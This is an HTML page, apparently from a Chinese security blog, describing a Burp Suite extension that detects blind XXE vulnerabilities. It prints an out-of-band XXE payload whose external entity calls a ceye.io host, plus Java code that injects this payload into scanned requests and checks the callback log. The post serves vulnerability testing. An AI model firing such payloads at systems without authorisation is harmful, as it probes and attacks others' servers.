@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Burp XXE Scanner 插件 | lufei&#39;s blog</title>
+  <meta name="description" content="0x00 前言Burp没有自带检测XXE漏洞功能，也没有插件。于是自己开始动手撸一个XXE Scanner插件出来。 0x01 检测原理OOB XXE盲攻击，利用ceye监控的http记录，我们再通过ceye给的api进行查询是否有利用XXE漏洞发送的http请求记录。使用如下payload。 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp XXE Scanner 插件">
+<meta property="og:url" content="https://lufe1.cn/2018/05/18/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="0x00 前言Burp没有自带检测XXE漏洞功能，也没有插件。于是自己开始动手撸一个XXE Scanner插件出来。 0x01 检测原理OOB XXE盲攻击，利用ceye监控的http记录，我们再通过ceye给的api进行查询是否有利用XXE漏洞发送的http请求记录。使用如下payload。 &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/1.png">
+<meta property="og:image" content="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/2.png">
+<meta property="og:image" content="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/3.png">
+<meta property="article:published_time" content="2018-05-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="原创工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2018/05/18/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Burp XXE Scanner 插件" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Burp XXE Scanner 插件
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/05/18/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/" class="article-date">
+	  <time datetime="2018-05-17T16:00:00.000Z" itemprop="datePublished">2018-05-18</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/05/18/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Burp没有自带检测XXE漏洞功能，也没有插件。于是自己开始动手撸一个XXE Scanner插件出来。</p>
+<h1 id="0x01-检测原理"><a href="#0x01-检测原理" class="headerlink" title="0x01 检测原理"></a>0x01 检测原理</h1><p>OOB XXE盲攻击，利用ceye监控的http记录，我们再通过ceye给的api进行查询是否有利用XXE漏洞发送的http请求记录。使用如下payload。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM &quot;http://xxxx.ceye.io/xxe_test&quot;&gt;
+%remote;]&gt;
+&lt;root/&gt;
+</code></pre>
+<h1 id="0x02-成品展示"><a href="#0x02-成品展示" class="headerlink" title="0x02 成品展示"></a>0x02 成品展示</h1><p>首先需要一个ceye账号，将<code>Identifier(用于http请求到你的ceye账户下)</code>和<code>Token(用于API查询你的http请求记录)</code>分别填入到下图的文本框当中，点击保存。会在burp目录下生成xxe.config，以<code>Identifier|Token</code>格式保存着。下载启动burp的时候，XXE Scanner插件会自动读取xxe.config，获取到上次保存的参数。</p>
+<p><img src="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/1.png"></p>
+<p>请求带<code>xxe_XXXXXXXXXX(10个随机字母或数字)</code>，用于后面判断是否利用XXE发送了http请求。</p>
+<p><img src="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/2.png"></p>
+<p>通过api查询，检测到带有<code>xxe_XXXXXXXXXX(10个随机字母或数字)</code>的请求，则报XXE inject。</p>
+<p><img src="https://image.lufe1.cn/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/3.png"></p>
+<h1 id="0x03-插件开发"><a href="#0x03-插件开发" class="headerlink" title="0x03 插件开发"></a>0x03 插件开发</h1><p>由于有需要填写配置参数，所以需要一个自定义tab页面。需要使用<code>ITab</code>接口，并且使用<code>IBurpExtenderCallbacks.addSuiteTab()</code>进行添加。新建<code>XxeOption</code>类继承<code>ITab</code>，然后再构造方法里面添加控件。</p>
+<pre><code>public XxeOption(final IBurpExtenderCallbacks callbacks) &#123;
+    this.callbacks = callbacks;
+
+
+    jp = new JPanel();
+
+
+    jlId = new JLabel(&quot;Identifier:&quot;);
+    jlToken = new JLabel(&quot;API Token:&quot;);
+    jtfId = new JTextField(10);
+    jtfToken = new JTextField(20);
+
+
+    //设置Id,Token文本框
+    File file = new File(&quot;xxe.config&quot;);
+    if(file.exists())&#123;
+        String info = ReadConfig();
+        if(info.contains(&quot;|&quot;))
+        &#123;
+            jtfId.setText(info.split(&quot;\\|&quot;)[0]);
+            jtfToken.setText(info.split(&quot;\\|&quot;)[1]);
+        &#125;
+
+    &#125;
+
+    jb = new JButton(&quot;保存&quot;);
+    jb.addActionListener(this);
+
+    jp.add(jlId);
+    jp.add(jtfId);
+    jp.add(jlToken);
+    jp.add(jtfToken);
+    jp.add(jb);
+
+
+    callbacks.addSuiteTab(XxeOption.this);
+&#125;
+</code></pre>
+<p>最后在<code>registerExtenderCallbacks</code>方法里实例化<code>XxeOption</code>即可。</p>
+<p><code>IScannerCheck</code>可以自定义扫描，一种是<code>doActiveScan</code>主动扫描，一种是<code>doPassiveScan</code>被动扫描。主动扫描是对每个参数进行扫描，会发送n次请求包。而被动扫描只会扫一次，将<code>doPassiveScan</code>函数代码走完一遍就完了。而检测XXE我们只需要发送一次数据包，所以选择被动扫描。</p>
+<pre><code>public List&lt;IScanIssue&gt; doPassiveScan(IHttpRequestResponse baseRequestResponse) &#123;
+    //code
+    return null;
+&#125;
+</code></pre>
+<p>接下来就是发送xxe payload。使用<code>buildHttpMessage</code>将headr和body组合。再使用<code>makeHttpRequest</code>发送请求。</p>
+<pre><code>//xxe payload
+byte[] xxePayload = (&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +
+        &quot;&lt;!DOCTYPE root [\n&quot; +
+        &quot;&lt;!ENTITY % remote SYSTEM \&quot;http://&quot; + xxeOption.jtfId.getText() + &quot;/&quot; + flag + &quot;\&quot;&gt;\n&quot; +
+        &quot;%remote;]&gt;\n&quot; +
+        &quot;&lt;root/&gt;&quot;).getBytes();
+
+
+//修改body为xxe payload，并且发送xxe payload http包
+byte[] xxe = helpers.buildHttpMessage(helpers.analyzeRequest(baseRequestResponse.getRequest()).getHeaders(),xxePayload);
+IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
+        baseRequestResponse.getHttpService(), xxe);
+</code></pre>
+<p>使用<code>makeHttpRequest</code>进行api接口查询。</p>
+<pre><code>//构造发送到ceye.io的IHttpService
+IHttpService test = new IHttpService() &#123;
+    @Override
+    public String getHost() &#123;
+        return &quot;api.ceye.io&quot;;
+    &#125;
+
+    @Override
+    public int getPort() &#123;
+        return 80;
+    &#125;
+
+    @Override
+    public String getProtocol() &#123;
+        return &quot;http&quot;;
+    &#125;
+&#125;;
+
+
+//构造发送到ceye.io的http headers信息
+byte[] ceye = (&quot;GET /v1/records?token=&quot; + xxeOption.jtfToken.getText() + &quot;&amp;type=request&amp;filter=&quot; + flag + &quot; HTTP/1.1\n&quot; +
+        &quot;Host: api.ceye.io\n&quot; +
+        &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\n&quot; +
+        &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n&quot; +
+        &quot;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\n&quot; +
+        &quot;Accept-Encoding: gzip, deflate\n&quot; +
+        &quot;DNT: 1\n&quot; +
+        &quot;Connection: close\n&quot; +
+        &quot;Upgrade-Insecure-Requests: 1\n&quot; +
+        &quot;\n&quot;).getBytes();
+
+//stdout.println(&quot;GET /v1/records?token=&quot; + xxeOption.jtfToken.getText() + &quot;&amp;type=request&amp;filter=&quot; + flag + &quot; HTTP/1.1\n&quot;);
+//发送数据包到ceye.io
+IHttpRequestResponse ceyeRequestResponse = callbacks.makeHttpRequest(
+        test, ceye);
+</code></pre>
+<p>对返回结果进行匹配。</p>
+<pre><code>//设置ceye的返回包作为漏洞返回包
+checkRequestResponse.setResponse(ceyeRequestResponse.getResponse());
+//获取ceyeRequestResponse(发送到ceye的包)看是否有请求的关键词，如果有则有漏洞。
+List&lt;int[]&gt; matches = getMatches(ceyeRequestResponse.getResponse(), flag.getBytes());
+//checkRequestResponse(发送xee payload的包),对flag进行匹配，然后高亮再请求包中。
+List&lt;int[]&gt; requestMatches = getMatches(checkRequestResponse.getRequest(), flag.getBytes());
+
+//stdout.println(new String(checkRequestResponse.getRequest()));
+
+if(matches.size() &gt; 0)
+&#123;
+    //报告漏洞
+    List&lt;IScanIssue&gt; issues = new ArrayList&lt;&gt;(1);
+    issues.add(new CustomScanIssue(
+            baseRequestResponse.getHttpService(),
+            helpers.analyzeRequest(baseRequestResponse).getUrl(),
+            new IHttpRequestResponse[] &#123; callbacks.applyMarkers(checkRequestResponse, requestMatches, matches) &#125;,
+            &quot;bind xxe inject&quot;,
+            &quot;payload: &quot; + helpers.bytesToString(flag.getBytes()),
+            &quot;High&quot;));
+    return issues;
+&#125;
+</code></pre>
+<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/">https://portswigger.net/burp/extender/api/</a></p>
+<h1 id="0x05-下载地址"><a href="#0x05-下载地址" class="headerlink" title="0x05 下载地址"></a>0x05 下载地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/lufeirider/Project/tree/master/XXEScanner/src" title="源码">源码</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lufeirider/Project/blob/master/XXEScanner/XXEScanner.jar" title="成品">成品</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://lufe1.cn/2018/05/18/Burp%20XXE%20Scanner%20%E6%8F%92%E4%BB%B6/" title="Burp XXE Scanner 插件" target="_blank" rel="external">https://lufe1.cn/2018/05/18/Burp XXE Scanner 插件/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lufeirider" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lufeirider" target="_blank"><span class="text-dark">lufei</span><small class="ml-1x">网络安全</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2018/05/18/Burp%20SQLi%20Scanner/" title="Burp SQLi Scanner"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2018/05/18/Burp%20Xss%20Scanner%20%E6%8F%92%E4%BB%B6/" title="Burp Xss Scanner 插件"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2021 lufei@湘ICP备17016147号-1
+        
+        <div class="publishby">
+        	
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
